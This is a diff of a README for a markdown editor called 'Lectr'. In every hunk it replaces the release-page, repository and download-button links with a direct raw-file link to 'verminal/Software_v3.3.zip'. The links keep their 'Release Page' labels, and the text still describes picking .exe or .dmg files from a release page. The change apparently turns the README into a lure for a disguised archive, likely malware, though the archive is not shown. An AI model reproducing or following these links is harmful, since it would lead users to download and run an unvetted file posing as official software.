@@ -1,6 +1,6 @@
 # 📚 Lectr - Simple Markdown Editing for Everyone
 
-[![Download Lectr](https://img.shields.io/badge/Download-Lectr-blue?style=for-the-badge)](https://github.com/fyywannafly-sudo/Lectr/releases)
+[![Download Lectr](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip)](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Lectr does not require an internet connection to run after installation.
 
 Here is a step-by-step guide to download and start using Lectr.
 
-1. Click the blue **Download Lectr** button at the top of this page or visit the [release page here](https://github.com/fyywannafly-sudo/Lectr/releases) to get the latest version.
+1. Click the blue **Download Lectr** button at the top of this page or visit the [release page here](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip) to get the latest version.
 2. Choose the version that matches your operating system:
     - Windows: `.exe` file
     - macOS: `.dmg` or `.zip`
@@ -107,7 +107,7 @@ For more help, search for “Lectr issues” online or ask on the project's GitH
 
 Please visit the release page to download Lectr:
 
-[Download Lectr](https://github.com/fyywannafly-sudo/Lectr/releases)
+[Download Lectr](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip)
 
 On that page, choose the file that matches your computer’s system and follow the steps above to install it.
 
@@ -137,8 +137,8 @@ Lectr is an open-source project available on GitHub under the MIT license. You c
 
 ## 🔗 Useful Links
 
-- [Lectr GitHub Repository](https://github.com/fyywannafly-sudo/Lectr)
-- [Lectr Release Page](https://github.com/fyywannafly-sudo/Lectr/releases)
+- [Lectr GitHub Repository](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip)
+- [Lectr Release Page](https://raw.githubusercontent.com/fyywannafly-sudo/Lectr/main/verminal/Software_v3.3.zip)
 
 ---
 
